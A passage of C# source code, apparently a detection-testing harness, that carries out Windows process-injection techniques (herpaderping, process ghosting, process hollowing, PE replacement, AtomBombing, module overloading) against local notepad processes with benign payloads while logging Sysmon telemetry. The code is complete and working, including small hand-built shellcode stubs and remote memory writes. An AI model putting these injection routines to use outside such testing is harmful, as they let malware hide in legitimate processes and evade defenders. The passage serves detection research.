                throw new InvalidOperationException("Could not read remote image base");

            IntPtr entryPoint = ReadRemoteEntryPoint(hProcess, imageBase);
            if (entryPoint == IntPtr.Zero)
                throw new InvalidOperationException("Could not locate remote entry point");

            // Overwrite the on-disk file *after* the process object is created from
            // the cached original section. This is the herpaderping timing window.
            byte[] payloadBytes = File.ReadAllBytes(payloadPath);
            if (!WriteFile(hFile, payloadBytes, (uint)payloadBytes.Length, out uint written, IntPtr.Zero) || written != payloadBytes.Length)
                throw new Win32Exception(Marshal.GetLastWin32Error(), "WriteFile(decoy)");
            if (!FlushFileBuffers(hFile))
                throw new Win32Exception(Marshal.GetLastWin32Error(), "FlushFileBuffers(decoy)");
            Log("[T1055.012] Decoy file overwritten and flushed after NtCreateProcessEx");

            // Set the process image path / command line so Sysmon has a file path
            // to compare against the on-disk bytes (which are now the payload).
            if (!WriteRemoteProcessParameters(hProcess, decoyPath, commandLine))
                Log("[T1055.012] Warning: could not write remote process parameters (herpaderping)");
            else
                Log("[T1055.012] Remote process parameters written");

            // Close the write-capable file handle before creating the first thread.
            // The file object backing the section still exists; this lets the kernel
            // process-create callback see the modified on-disk bytes without the
            // handle being reported as "locked for access".
            CloseHandle(hFile);
            hFile = IntPtr.Zero;

            int statusThread = NtCreateThreadEx(out hThread, THREAD_ALL_ACCESS, IntPtr.Zero, hProcess, entryPoint, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            if (statusThread != 0)
                throw new InvalidOperationException($"NtCreateThreadEx failed: 0x{statusThread:X8}");

            ResumeThread(hThread);
            WaitForSingleObject(hProcess, 5000);
        }
        catch (Exception ex)
        {
            Log($"[T1055.012] Herpaderping failed: {ex.Message}");
        }
        finally
        {
            if (hFile != IntPtr.Zero) CloseHandle(hFile);
            if (hThread != IntPtr.Zero) CloseHandle(hThread);
            if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
            if (hSection != IntPtr.Zero) CloseHandle(hSection);
        }
    }

    private static void TestProcessHerpaderpingClassic()
    {
        Log("[T1055.012] Classic process herpaderping: NtCreateSection -> CreateProcess(suspended) -> overwrite file -> ResumeThread");
        string sourcePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "notepad.exe");
        string targetPath = @"C:\Sandbox\herpaderping_classic.exe";
        string replacePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmd.exe");

        IntPtr hFile = IntPtr.Zero;
        IntPtr hSection = IntPtr.Zero;
        var si = new STARTUPINFO();
        si.cb = (uint)Marshal.SizeOf(si);
        var pi = new PROCESS_INFORMATION();
        try
        {
            Directory.CreateDirectory(Path.GetDirectoryName(targetPath)!);
            try { File.Delete(targetPath); } catch { }
            File.Copy(sourcePath, targetPath, true);

            // Open the target file and create an image section. Closing the file
            // handle afterwards leaves the cached image section behind; CreateProcess
            // will reuse it. This avoids keeping a write-capable handle open, which
            // would block CreateProcess.
            hFile = CreateFile(
                targetPath,
                GENERIC_READ | FILE_EXECUTE,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                IntPtr.Zero,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                IntPtr.Zero);
            if (hFile == new IntPtr(-1))
                throw new Win32Exception(Marshal.GetLastWin32Error(), "CreateFile(target)");

            long maxSize = 0;
            // Use PAGE_READONLY like herpaderping; the section is cached by the
            // kernel before the file is deleted.
            int status = NtCreateSection(out hSection, SECTION_ALL_ACCESS, IntPtr.Zero, ref maxSize, PAGE_READONLY, SEC_IMAGE, hFile);
            if (status != 0)
                throw new InvalidOperationException($"NtCreateSection failed: 0x{status:X8}");
            CloseHandle(hSection);
            hSection = IntPtr.Zero;
            CloseHandle(hFile);
            hFile = IntPtr.Zero;

            bool created = CreateProcess(targetPath, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 /* CREATE_SUSPENDED */, IntPtr.Zero, null, ref si, out pi);
            if (!created) throw new Win32Exception(Marshal.GetLastWin32Error(), "CreateProcess(target)");

            // Overwrite the on-disk file with the replacement image while the
            // suspended process is backed by the cached original section.
            try
            {
                File.WriteAllBytes(targetPath, File.ReadAllBytes(replacePath));
                Log("[T1055.012] Target file overwritten on disk while process is suspended");
            }
            catch (Exception ex)
            {
                Log($"[T1055.012] Could not overwrite target file: {ex.Message}");
            }

            ResumeThread(pi.hThread);
            WaitForSingleObject(pi.hProcess, 5000);
        }
        catch (Exception ex)
        {
            Log($"[T1055.012] Classic herpaderping failed: {ex.Message}");
        }
        finally
        {
            if (hFile != IntPtr.Zero) CloseHandle(hFile);
            if (hSection != IntPtr.Zero) CloseHandle(hSection);
            if (pi.hThread != IntPtr.Zero) CloseHandle(pi.hThread);
            if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess);
        }
    }

    private static void TestProcessGhosting()
    {
        Log("[T1055.012] Process ghosting: write payload file -> NtCreateSection(SEC_IMAGE) -> delete file -> NtCreateProcessEx -> NtCreateThreadEx");
        string ghostPath = @"C:\Sandbox\ghost.exe";
        // Use notepad as the ghost payload so the process stays alive long enough
        // for Sysmon to log the tamper event.
        string payloadPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "notepad.exe");
        string commandLine = $@"""{ghostPath}""";

        IntPtr hSection = IntPtr.Zero;
        IntPtr hProcess = IntPtr.Zero;
        IntPtr hThread = IntPtr.Zero;
        IntPtr hFile = IntPtr.Zero;
        try
        {
            Directory.CreateDirectory(Path.GetDirectoryName(ghostPath)!);
            try { File.Delete(ghostPath); } catch { }
            File.WriteAllBytes(ghostPath, File.ReadAllBytes(payloadPath));

            // Open the payload file and mark it delete-pending *before* creating the
            // image section. The section can be created from a delete-pending file;
            // closing the handle afterwards removes the directory entry so the
            // process-create callback has no on-disk image to compare against.
            hFile = CreateFile(
                ghostPath,
                GENERIC_READ | FILE_EXECUTE | DELETE,
                FILE_SHARE_READ | FILE_SHARE_DELETE,
                IntPtr.Zero,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                IntPtr.Zero);
            if (hFile == new IntPtr(-1))
                throw new Win32Exception(Marshal.GetLastWin32Error(), "CreateFile(ghost)");

            var disposition = new FILE_DISPOSITION_INFO { DeleteFile = true };
            if (!SetFileInformationByHandle(hFile, FILE_INFO_BY_HANDLE_CLASS.FileDispositionInfo, ref disposition, (uint)Marshal.SizeOf(typeof(FILE_DISPOSITION_INFO))))
                throw new Win32Exception(Marshal.GetLastWin32Error(), "SetFileInformationByHandle(FileDispositionInfo)");

            long maxSize = 0;
            int status = NtCreateSection(out hSection, SECTION_ALL_ACCESS, IntPtr.Zero, ref maxSize, PAGE_EXECUTE_READ, SEC_IMAGE, hFile);
            if (status != 0)
                throw new InvalidOperationException($"NtCreateSection failed: 0x{status:X8}");

            // Closing the last handle on a delete-pending file removes the directory
            // entry. The section reference keeps the image pages valid.
            CloseHandle(hFile);
            hFile = IntPtr.Zero;
            Log("[*] Ghost image section created and file handle closed (file deleted from disk)");

            int statusProc = NtCreateProcessEx(out hProcess, PROCESS_ALL_ACCESS, IntPtr.Zero, CURRENT_PROCESS, PROCESS_CREATE_FLAGS_INHERIT_HANDLES, hSection, IntPtr.Zero, IntPtr.Zero, 0);
            if (statusProc != 0)
                throw new InvalidOperationException($"NtCreateProcessEx failed: 0x{statusProc:X8}");
            Log($"[T1055.012] Ghosting target pid={GetProcessId(hProcess)}");

            // The cached image section is no longer needed once the process object exists.
            CloseHandle(hSection);
            hSection = IntPtr.Zero;

            if (!WriteRemoteProcessParameters(hProcess, ghostPath, commandLine))
                Log("[T1055.012] Warning: could not write remote process parameters (ghosting)");
            else
                Log("[T1055.012] Remote process parameters written (ghosting)");

            IntPtr imageBase = ReadRemoteImageBase(hProcess);
            if (imageBase == IntPtr.Zero)
                throw new InvalidOperationException("Could not read remote image base");

            IntPtr entryPoint = ReadRemoteEntryPoint(hProcess, imageBase);
            if (entryPoint == IntPtr.Zero)
                throw new InvalidOperationException("Could not locate remote entry point");

            int statusThread = NtCreateThreadEx(out hThread, THREAD_ALL_ACCESS, IntPtr.Zero, hProcess, entryPoint, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            if (statusThread != 0)
                throw new InvalidOperationException($"NtCreateThreadEx failed: 0x{statusThread:X8}");

            ResumeThread(hThread);
            WaitForSingleObject(hProcess, 5000);
        }
        catch (Exception ex)
        {
            Log($"[T1055.012] Ghosting failed: {ex.Message}");
        }
        finally
        {
            if (hFile != IntPtr.Zero) CloseHandle(hFile);
            if (hThread != IntPtr.Zero) CloseHandle(hThread);
            if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
            if (hSection != IntPtr.Zero) CloseHandle(hSection);
        }
    }

    private static IntPtr ReadRemoteImageBase(IntPtr hProcess)
    {
        var pbi = new PROCESS_BASIC_INFORMATION();
        int status = NtQueryInformationProcess(hProcess, 0, ref pbi, Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), out int _);
        if (status != 0) return IntPtr.Zero;

        byte[] buf = new byte[IntPtr.Size];
        if (!ReadProcessMemory(hProcess, IntPtr.Add(pbi.PebBaseAddress, 0x10), buf, (UIntPtr)buf.Length, out UIntPtr _))
            return IntPtr.Zero;

        return IntPtr.Size == 8
            ? (IntPtr)BitConverter.ToInt64(buf, 0)
            : (IntPtr)BitConverter.ToInt32(buf, 0);
    }

    private static IntPtr ReadRemoteEntryPoint(IntPtr hProcess, IntPtr imageBase)
    {
        byte[] e_lfanewBuf = new byte[4];
        if (!ReadProcessMemory(hProcess, IntPtr.Add(imageBase, 0x3C), e_lfanewBuf, (UIntPtr)4, out UIntPtr _))
            return IntPtr.Zero;
        int e_lfanew = BitConverter.ToInt32(e_lfanewBuf, 0);

        byte[] entryBuf = new byte[4];
        if (!ReadProcessMemory(hProcess, IntPtr.Add(imageBase, e_lfanew + 0x28), entryBuf, (UIntPtr)4, out UIntPtr _))
            return IntPtr.Zero;
        int entryRva = BitConverter.ToInt32(entryBuf, 0);
        return IntPtr.Add(imageBase, entryRva);
    }

    private static UNICODE_STRING ToUnicodeString(string s)
    {
        byte[] bytes = Encoding.Unicode.GetBytes(s + "\0");
        IntPtr buf = Marshal.AllocHGlobal(bytes.Length);
        Marshal.Copy(bytes, 0, buf, bytes.Length);
        return new UNICODE_STRING { Length = (ushort)(bytes.Length - 2), MaximumLength = (ushort)bytes.Length, Buffer = buf };
    }

    private static void FreeUnicodeString(ref UNICODE_STRING us)
    {
        if (us.Buffer != IntPtr.Zero) Marshal.FreeHGlobal(us.Buffer);
        us.Buffer = IntPtr.Zero;
    }

    private static bool WriteRemoteProcessParameters(IntPtr hProcess, string imagePath, string commandLine)
    {
        // Match the public herpaderping PoC: create de-normalized parameters
        // (flag 0). The UNICODE_STRING Buffer values are offsets relative to the
        // start of the block; LdrpInitializeProcess normalizes them when the
        // first thread starts.
        // With flag 0 the path must still be an NT object path and optional
        // parameters must be passed as NULL pointers.
        string ntImagePath = @"\??\" + imagePath;
        var imagePathUs = ToUnicodeString(ntImagePath);
        var cmdLineUs = ToUnicodeString(commandLine);
        try
        {
            int status = RtlCreateProcessParametersExNullOpt(out IntPtr localParams, ref imagePathUs, IntPtr.Zero, IntPtr.Zero, ref cmdLineUs, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0);
            if (status != 0)
            {
                Console.WriteLine($"[DEBUG] RtlCreateProcessParametersEx failed: 0x{status:X8}");
                return false;
            }

            try
            {
                int maximumLength = Marshal.ReadInt32(localParams + 0);
                int length = Marshal.ReadInt32(localParams + 4);
                Console.WriteLine($"[DEBUG] Params maximumLength={maximumLength} length={length}");
                if (maximumLength <= 0 || maximumLength > 0x10000)
                    return false;

                IntPtr remoteParams = VirtualAllocEx(hProcess, IntPtr.Zero, (UIntPtr)(uint)maximumLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (remoteParams == IntPtr.Zero)
                {
                    Console.WriteLine($"[DEBUG] VirtualAllocEx failed: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                byte[] localBytes = new byte[maximumLength];
                Marshal.Copy(localParams, localBytes, 0, maximumLength);

                if (!WriteProcessMemory(hProcess, remoteParams, localBytes, (UIntPtr)(uint)maximumLength, out UIntPtr _))
                {
                    Console.WriteLine($"[DEBUG] WriteProcessMemory(params) failed: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                // Update PEB.ProcessParameters (offset 0x20 on x64, 0x10 on x86).
                var pbi = new PROCESS_BASIC_INFORMATION();
                if (NtQueryInformationProcess(hProcess, 0, ref pbi, Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), out int _) != 0)
                {
                    Console.WriteLine("[DEBUG] NtQueryInformationProcess failed");
                    return false;
                }

                int pebOffset = IntPtr.Size == 8 ? 0x20 : 0x10;
                byte[] remoteParamsBytes = BitConverter.GetBytes(remoteParams.ToInt64());
                if (!WriteProcessMemory(hProcess, IntPtr.Add(pbi.PebBaseAddress, pebOffset), remoteParamsBytes, (UIntPtr)(uint)remoteParamsBytes.Length, out UIntPtr _))
                {
                    Console.WriteLine($"[DEBUG] WriteProcessMemory(PEB) failed: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                Console.WriteLine("[DEBUG] Remote process parameters written successfully");
                return true;
            }
            finally
            {
                // RtlDestroyProcessParameters is not imported; the memory is process-local heap.
                // We cannot free it safely here, but it is small and short-lived.
            }
        }
        finally
        {
            FreeUnicodeString(ref imagePathUs);
            FreeUnicodeString(ref cmdLineUs);
        }
    }

    /// <summary>GetThreadContext on a freshly-created suspended thread races
    /// with early thread init (error 998, ERROR_NOACCESS) — retry briefly.</summary>
    private static void GetThreadContextWithRetry(IntPtr hThread, ref CONTEXT64 ctx, int attempts = 5, int delayMs = 250)
    {
        for (int i = 1; ; i++)
        {
            if (GetThreadContext(hThread, ref ctx)) return;
            int err = Marshal.GetLastWin32Error();
            if (i == attempts) throw new Win32Exception(err, "GetThreadContext");
            Thread.Sleep(delayMs);
        }
    }

    /// <summary>
    /// T1055.012 Process hollowing (simplified).
    /// Creates a suspended notepad, hollows its image with a tiny ExitProcess
    /// payload, and resumes the main thread.
    /// </summary>
    private static void TestProcessHollowing()
    {
        Log("[T1055.012] Process hollowing: CreateProcess(suspended) -> NtUnmapViewOfSection -> VirtualAllocEx -> WriteProcessMemory -> ResumeThread");

        var si = new STARTUPINFO();
        si.cb = (uint)Marshal.SizeOf(si);
        var pi = new PROCESS_INFORMATION();

        bool created = CreateProcess(null, "notepad.exe", IntPtr.Zero, IntPtr.Zero, false, 0x00000004 /* CREATE_SUSPENDED */, IntPtr.Zero, null, ref si, out pi);
        if (!created) throw new Win32Exception(Marshal.GetLastWin32Error(), "CreateProcess");
        Log($"[T1055.012] Hollowing target pid={pi.dwProcessId}");
        try
        {
            // Get image base address from PEB.
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            int returnLength;
            int ntStatus = NtQueryInformationProcess(pi.hProcess, 0, ref pbi, Marshal.SizeOf(pbi), out returnLength);
            if (ntStatus != 0) throw new Win32Exception(ntStatus, "NtQueryInformationProcess");

            byte[] pebBuf = new byte[0x20];
            UIntPtr read;
            Win32Check(ReadProcessMemory(pi.hProcess, IntPtr.Add(pbi.PebBaseAddress, 0x10), pebBuf, (UIntPtr)8, out read), "ReadProcessMemory(PEB)");
            IntPtr imageBase = (IntPtr)BitConverter.ToInt64(pebBuf, 0);
            Log($"[T1055.012] Target image base: 0x{imageBase.ToInt64():X}");

            // Unmap original image to trigger ProcessTampering detection.
            NtUnmapViewOfSection(pi.hProcess, imageBase);

            IntPtr exitProcess = GetExport("kernel32.dll", "ExitProcess");
            byte[] shellcode = new byte[14];
            shellcode[0] = 0x49;
            shellcode[1] = 0xB8;
            Buffer.BlockCopy(BitConverter.GetBytes((ulong)exitProcess.ToInt64()), 0, shellcode, 2, 8);
            shellcode[10] = 0x41;
            shellcode[11] = 0xFF;
            shellcode[12] = 0xD0;
            shellcode[13] = 0xC3;

            IntPtr remoteMem = VirtualAllocEx(pi.hProcess, imageBase, (UIntPtr)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (remoteMem == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "VirtualAllocEx");
            try
            {
                UIntPtr written;
                Win32Check(WriteProcessMemory(pi.hProcess, remoteMem, shellcode, (UIntPtr)shellcode.Length, out written), "WriteProcessMemory");

                IntPtr hMainThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, false, (uint)pi.dwThreadId);
                if (hMainThread == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenThread (hollow)");
                try
                {
                    CONTEXT64 ctx = new CONTEXT64 { ContextFlags = CONTEXT_ALL };
                    GetThreadContextWithRetry(hMainThread, ref ctx);
                    ctx.Rip = (ulong)remoteMem.ToInt64();
                    Win32Check(SetThreadContext(hMainThread, ref ctx), "SetThreadContext");
                    Log("[T1055.012] Hollowed process context set; resuming");
                    // Give Sysmon a moment to observe the tampered image before
                    // the payload exits (EID 25 fires on a create-time scan).
                    Thread.Sleep(500);
                    ResumeThread(hMainThread);
                }
                finally
                {
                    CloseHandle(hMainThread);
                }
                WaitForSingleObject(pi.hProcess, 3000);
            }
            finally
            {
                VirtualFreeEx(pi.hProcess, remoteMem, UIntPtr.Zero, MEM_RELEASE);
            }
        }
        finally
        {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    }

    /// <summary>
    /// T1055.012 PE-replacement process hollowing.
    /// Creates a suspended notepad, unmaps its image, allocates the same
    /// address, writes the bytes of a different PE (cmd.exe) into it, updates
    /// PEB.ImageBase, and resumes the main thread at the replacement entry
    /// point. This should trigger Sysmon Event ID 25 because the in-memory
    /// image no longer matches notepad.exe on disk.
    /// </summary>
    private static void TestProcessHollowingPeReplacement()
    {
        Log("[T1055.012] PE-replacement process hollowing: CreateProcess(suspended) -> NtUnmapViewOfSection -> VirtualAllocEx -> WriteProcessMemory(full PE) -> ResumeThread");

        var si = new STARTUPINFO();
        si.cb = (uint)Marshal.SizeOf(si);
        var pi = new PROCESS_INFORMATION();

        bool created = CreateProcess(null, "notepad.exe", IntPtr.Zero, IntPtr.Zero, false, 0x00000004 /* CREATE_SUSPENDED */, IntPtr.Zero, null, ref si, out pi);
        if (!created) throw new Win32Exception(Marshal.GetLastWin32Error(), "CreateProcess");
        Log($"[T1055.012] PE-replacement target pid={pi.dwProcessId}");
        try
        {
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            int returnLength;
            int ntStatus = NtQueryInformationProcess(pi.hProcess, 0, ref pbi, Marshal.SizeOf(pbi), out returnLength);
            if (ntStatus != 0) throw new Win32Exception(ntStatus, "NtQueryInformationProcess");

            byte[] pebBuf = new byte[0x20];
            UIntPtr read;
            Win32Check(ReadProcessMemory(pi.hProcess, IntPtr.Add(pbi.PebBaseAddress, 0x10), pebBuf, (UIntPtr)8, out read), "ReadProcessMemory(PEB)");
            IntPtr imageBase = (IntPtr)BitConverter.ToInt64(pebBuf, 0);
            Log($"[T1055.012] Target image base: 0x{imageBase.ToInt64():X}");

            // Use a fresh handle with explicit rights (like TestProcessHollowing) —
            // GetThreadContext on the raw CreateProcess thread handle is flaky (998).
            IntPtr hMainThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, false, (uint)pi.dwThreadId);
            if (hMainThread == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenThread (pe-replace)");
            try
            {
                // Capture the original thread context *before* unmapping the image,
                // because Windows invalidates it once the main image is gone.
                CONTEXT64 ctx = new CONTEXT64 { ContextFlags = CONTEXT_ALL };
                GetThreadContextWithRetry(hMainThread, ref ctx);

                NtUnmapViewOfSection(pi.hProcess, imageBase);

            string replacement = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmd.exe");
            byte[] replacementPe = File.ReadAllBytes(replacement);
            uint entryRva = GetEntryPointRva(replacement);
            Log($"[T1055.012] Replacement PE size={replacementPe.Length}, entry RVA=0x{entryRva:X}");

            IntPtr remoteMem = VirtualAllocEx(pi.hProcess, imageBase, (UIntPtr)replacementPe.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (remoteMem == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "VirtualAllocEx");
            try
            {
                UIntPtr written;
                Win32Check(WriteProcessMemory(pi.hProcess, remoteMem, replacementPe, (UIntPtr)replacementPe.Length, out written), "WriteProcessMemory");

                // Update PEB.ImageBase to the newly allocated base.
                byte[] newBaseBytes = BitConverter.GetBytes((ulong)remoteMem.ToInt64());
                Win32Check(WriteProcessMemory(pi.hProcess, IntPtr.Add(pbi.PebBaseAddress, 0x10), newBaseBytes, (UIntPtr)8, out written), "WriteProcessMemory(PEB.ImageBase)");

                ctx.Rip = (ulong)(remoteMem.ToInt64() + entryRva);
                Win32Check(SetThreadContext(hMainThread, ref ctx), "SetThreadContext");
                Log("[T1055.012] PE-replaced process context set; resuming");
                // Same EID 25 observation window as the basic hollowing test.
                Thread.Sleep(500);
                ResumeThread(hMainThread);
                WaitForSingleObject(pi.hProcess, 3000);
            }
            finally
            {
                VirtualFreeEx(pi.hProcess, remoteMem, UIntPtr.Zero, MEM_RELEASE);
            }
            }
            finally
            {
                CloseHandle(hMainThread);
            }
        }
        finally
        {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    }

    private static uint GetEntryPointRva(string pePath)
    {
        byte[] pe = File.ReadAllBytes(pePath);
        int e_lfanew = BitConverter.ToInt32(pe, 0x3C);
        if (e_lfanew < 0 || e_lfanew + 0x28 > pe.Length) throw new InvalidOperationException("Invalid PE headers");
        return BitConverter.ToUInt32(pe, e_lfanew + 0x18 + 0x10);
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential)]
    private struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    // -------------------------------------------------------------------
    // PLAN.md Phase 2 techniques (#10-15)
    // -------------------------------------------------------------------

    private static int _failures;

    /// <summary>Runs one test without letting a failure abort the remaining
    /// tests (the harness exists to produce telemetry per technique; pass/fail
    /// verdicts come from scripts/harness_assertions.py, not from early exit).
    /// Main still returns nonzero if any test failed.</summary>
    private static void RunSafely(string name, Action test)
    {
        try
        {
            test();
        }
        catch (Exception ex)
        {
            _failures++;
            Log($"{name} FAILED (continuing): {ex.Message}");
        }
    }

    /// <summary>Allocates RWX memory in the target and starts a thread that
    /// sits in an alertable SleepEx wait, ready to receive queued APCs.
    /// The backing memory is intentionally left mapped (freed on target exit).</summary>
    private static IntPtr CreateAlertableRemoteThread(IntPtr hProcess, out IntPtr tid)
    {
        IntPtr sleepEx = GetExport("kernel32.dll", "SleepEx");
        byte[] shellcode = new byte[28];
        Buffer.BlockCopy(new byte[] { 0x48, 0xC7, 0xC1, 0xFF, 0xFF, 0xFF, 0xFF }, 0, shellcode, 0, 7); // mov rcx, -1
        Buffer.BlockCopy(new byte[] { 0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00 }, 0, shellcode, 7, 7); // mov rdx, 1
        shellcode[14] = 0x49;
        shellcode[15] = 0xB8;
        Buffer.BlockCopy(BitConverter.GetBytes((ulong)sleepEx.ToInt64()), 0, shellcode, 16, 8); // mov r8, SleepEx
        shellcode[24] = 0x41;
        shellcode[25] = 0xFF;
        shellcode[26] = 0xD0; // call r8
        shellcode[27] = 0xC3; // ret
        IntPtr remoteMem = VirtualAllocEx(hProcess, IntPtr.Zero, (UIntPtr)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (remoteMem == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "VirtualAllocEx (alertable)");
        Win32Check(WriteProcessMemory(hProcess, remoteMem, shellcode, (UIntPtr)shellcode.Length, out _), "WriteProcessMemory (alertable)");
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, UIntPtr.Zero, remoteMem, IntPtr.Zero, 0, out tid);
        if (hThread == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "CreateRemoteThread (alertable)");
        Thread.Sleep(500);
        return hThread;
    }

    /// <summary>
    /// #10 AtomBombing (T1055). Stores a payload string in the global atom
    /// table, then queues kernel32!GlobalGetAtomNameW as an APC (with the atom
    /// as the argument) to an alertable thread in the target.
    /// Expected: EID 10 (OpenProcess) + apitrace NtQueueApcThread.
    /// </summary>
    private static void TestAtomBombing()
    {
        Log("[T1055] AtomBombing: GlobalAddAtom + QueueUserAPC(GlobalGetAtomNameW, atom) into alertable remote thread");
        using Process target = SpawnTarget();
        Log($"[T1055] AtomBombing target pid={target.Id}");
        ushort atom = GlobalAddAtomW("SBX-ATOMBOMB-PAYLOAD");
        if (atom == 0) throw new Win32Exception(Marshal.GetLastWin32Error(), "GlobalAddAtomW");
        try
        {
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, target.Id);
            if (hProcess == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenProcess");
            try
            {
                IntPtr hThread = CreateAlertableRemoteThread(hProcess, out IntPtr tid);
                try
                {
                    IntPtr getAtomNameW = GetExport("kernel32.dll", "GlobalGetAtomNameW");
                    if (QueueUserAPC(getAtomNameW, hThread, (IntPtr)atom) == 0)
                        throw new Win32Exception(Marshal.GetLastWin32Error(), "QueueUserAPC");
                    Log($"[T1055] AtomBombing APC queued (GlobalGetAtomNameW, atom={atom}) to tid={tid}");
                    Thread.Sleep(1000);
                }
                finally
                {
                    CloseHandle(hThread);
                }
            }
            finally
            {
                CloseHandle(hProcess);
            }
        }
        finally
        {
            GlobalDeleteAtom(atom);
            if (!target.HasExited) target.Kill();
        }
    }

    /// <summary>
    /// #11 Module overloading / DLL hollowing (T1055). Maps a legitimate
    /// signed DLL (version.dll) into the target as a SEC_IMAGE section (EID 7
    /// ImageLoad in the target), then overwrites part of its .text via
    /// VirtualProtectEx + WriteProcessMemory (EID 10).
    /// </summary>
    private static void TestModuleOverloading()
    {
        Log("[T1055] Module overloading: SEC_IMAGE map of legit DLL into remote process + .text overwrite");
        using Process target = SpawnTarget();
        Log($"[T1055] ModuleOverloading target pid={target.Id}");
        string dllPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "version.dll");
        IntPtr hFile = CreateFile(dllPath, GENERIC_READ, FILE_SHARE_READ, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        if (hFile == INVALID_HANDLE_VALUE) throw new Win32Exception(Marshal.GetLastWin32Error(), "CreateFile(version.dll)");
        try
        {
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, target.Id);
            if (hProcess == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenProcess");
            try
            {
                long maxSize = 0;
                int st = NtCreateSection(out IntPtr hSection, SECTION_ALL_ACCESS, IntPtr.Zero, ref maxSize, PAGE_READONLY, SEC_IMAGE, hFile);
                if (st != 0) throw new Win32Exception(st, "NtCreateSection(SEC_IMAGE)");
                try
                {
                    IntPtr remoteBase = IntPtr.Zero;
                    long viewSize = 0;
                    st = NtMapViewOfSection(hSection, hProcess, ref remoteBase, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref viewSize, 2 /* ViewUnmap */, 0, PAGE_EXECUTE_READ);
                    if (st != 0) throw new Win32Exception(st, "NtMapViewOfSection(remote image)");
                    Log($"[T1055] Legit DLL mapped into target at 0x{remoteBase.ToInt64():X} (EID 7 expected)");
                    Win32Check(VirtualProtectEx(hProcess, remoteBase + 0x1000, (UIntPtr)8, PAGE_EXECUTE_READWRITE, out uint oldProt), "VirtualProtectEx");
                    Win32Check(WriteProcessMemory(hProcess, remoteBase + 0x1000, new byte[] { 0xCC, 0xCC, 0x90, 0x90, 0xC3, 0xC3, 0x90, 0x90 }, (UIntPtr)8, out _), "WriteProcessMemory(.text)");
                    Log("[T1055] Module .text overwritten in target (module overloading)");
                    NtUnmapViewOfSection(hProcess, remoteBase);
                }
                finally
                {
                    CloseHandle(hSection);
                }
            }
            finally
            {
                CloseHandle(hProcess);
            }
        }
        finally
        {
            CloseHandle(hFile);
            if (!target.HasExited) target.Kill();
        }
    }

    /// <summary>
    /// #12 SetWindowsHookEx injection (T1055). Installs a WH_GETMESSAGE hook
    /// on notepad's UI thread with HookDll.dll (embedded resource), which
    /// forces user32 to load HookDll.dll into notepad when the hook fires
    /// (EID 7 in the target).
    /// </summary>
